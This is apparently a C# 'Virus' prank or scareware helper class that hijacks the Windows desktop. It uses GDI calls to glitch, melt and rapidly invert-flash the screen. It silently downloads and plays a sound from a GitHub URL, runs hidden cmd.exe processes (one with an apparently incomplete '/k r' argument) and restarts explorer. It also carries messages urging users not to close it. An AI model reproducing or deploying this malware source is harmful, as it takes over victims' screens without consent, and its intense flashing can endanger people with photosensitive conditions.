using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Virus
{
    public static class Helper
    {
        public const int NORMAL = 13369376;
        public const int DIRTY = 8658951;
        private static int glitch_count = 2000;
        public static List<string> closingmessages = new List<string> { "Hey! You can't just leave :/", "Don't try to leave!", "No leaving for you!", "Don't leave me!!", "Just click the button, then you can go!" };
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
        public enum TernaryRasterOperations
        {
            SRCCOPY = 13369376,
            NOTSRCCOPY = 3342344
        }
        [DllImport("user32.dll")]
        private static extern IntPtr GetDesktopWindow();

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("gdi32.dll", ExactSpelling = true)]
        private static extern IntPtr BitBlt(IntPtr hDestDC, int x, int y, int nWidth, int nHeight, IntPtr hSrcDC, int xSrc, int ySrc, int dwRop);
        public static void GlitchScreen()
        {
            Random random = new Random();
            for (; ; )
            {
                IntPtr desktopWindow = GetDesktopWindow();
                IntPtr windowDC = GetWindowDC(desktopWindow);
                RECT rect;
                GetWindowRect(desktopWindow, out rect);
                BitBlt(windowDC, random.Next(0, Screen.PrimaryScreen.Bounds.Width), random.Next(0, Screen.PrimaryScreen.Bounds.Height), rect.Right += random.Next(500), rect.Bottom += random.Next(500), windowDC, 0, 0, 8658951);
                if (glitch_count > 200)
                {
                    Thread.Sleep(glitch_count -= 100);
                }
                else
                {
                    Thread.Sleep(100);
                }
            }
        }

        [DllImport("gdi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);

        [DllImport("gdi32.dll")]
        public static extern bool DeleteDC(IntPtr hdc);

        [DllImport("user32.dll")]
        private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        public static void ScreenMelting()
        {
            Random random = new Random();
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            IntPtr intPtr = GetWindowDC(GetDesktopWindow());
            for (; ; )
            {
                intPtr = GetWindowDC(GetDesktopWindow());
                BitBlt(intPtr, 0, random.Next(10), random.Next(width), height, intPtr, 0, 0, TernaryRasterOperations.SRCCOPY);
                DeleteDC(intPtr);
                if (random.Next(100) == 1)
                {
                    InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                }
                Thread.Sleep(random.Next(10));
            }
        }
        public static void ScreenFlashing()
        {
            int num = 1000;
            int width = Screen.PrimaryScreen.Bounds.Width;
            int height = Screen.PrimaryScreen.Bounds.Height;
            IntPtr intPtr = GetWindowDC(GetDesktopWindow());
            for (; ; )
            {
                intPtr = GetWindowDC(GetDesktopWindow());
                BitBlt(intPtr, 0, 0, width, height, intPtr, 0, 0, TernaryRasterOperations.NOTSRCCOPY);
                DeleteDC(intPtr);
                if (num > 51)
                {
                    Thread.Sleep(num -= 50);
                }
                else
                {
                    Thread.Sleep(50);
                }
            }
        }
        public static void ClearScreen()
        {
            int i = 0;
            while (i < 10)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                i++;
                Thread.Sleep(10);
            }
        }
        public static void DownloadSound()
        {
            if (!File.Exists(Path.GetTempPath() + "sound2.wav"))
            {
                new WebClient().DownloadFile("https://github.com/YungSamzy/i2fp/raw/main/snd.wav", Path.GetTempPath() + "sound2.wav");
            }
        }
        public static void KillSelf()
        {
            Environment.Exit(0);
            Application.Exit();
            Process.GetCurrentProcess().Kill();
        }
        public static void Kill()
        {
            Thread thread = new Thread(new ThreadStart(GlitchScreen));
            Thread thread2 = new Thread(new ThreadStart(GlitchScreen));
            Thread thread3 = new Thread(new ThreadStart(ScreenMelting));
            Thread thread4 = new Thread(new ThreadStart(ScreenFlashing));
            SoundPlayer soundPlayer = new SoundPlayer(Path.GetTempPath() + "sound2.wav");
            soundPlayer.Play();
            if (Process.GetProcessesByName("explorer").Length == 1)
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = "/k r"
                });
            }
            thread3.Start();
            thread4.Start();
            thread.Start();
            thread2.Start();
            Thread.Sleep(15000);
            thread.Abort();
            thread2.Abort();
            thread4.Abort();
            thread3.Abort();
            soundPlayer.Stop();
            ClearScreen();
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd.exe",
                WindowStyle = ProcessWindowStyle.Hidden,
                Arguments = "start explorer.exe && exit"
            });
        }
    }
}
